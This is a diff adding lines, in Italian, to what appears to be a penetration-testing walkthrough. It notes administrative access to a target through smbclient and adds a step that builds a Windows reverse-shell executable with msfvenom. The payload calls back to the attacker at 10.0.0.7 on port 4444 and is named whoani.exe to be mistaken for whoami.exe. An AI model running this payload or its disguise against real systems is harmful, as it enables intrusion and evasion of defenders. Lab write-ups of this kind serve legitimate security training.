@@ -118,3 +118,11 @@ Prima dell'utilizzo di **proxychain4** è necessaria una modifica del file di co
 
 ![smbclient](Proxychain4-smbclient.jpg)
 
+**smbclient** permette di avere accesso alle risorse del *target* (con i privilegi dell'utente connesso nel caso specifico privilegi amministrativi quindi controllo completo.)
+
+#### Passo 10 - Creazione della **Reverse-Shell** ####
+Si è provveduto a creare un file eseguibile che avvia una **reverse-shell** 'settata' per comunicare con la macchina attaccante (IP=10.0.0.7) sulla '**porta 4444**' attraverso il software **msfvenom**. Virne denominata 'whoani.exe' per 'confonderla' con un 'eseguibile' presente in 'C:\Windows\System32' denominato 'whoami.exe'. 
+
+ `msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.7 LPORT=4444 -f exe -o whoani.exe`
+
+
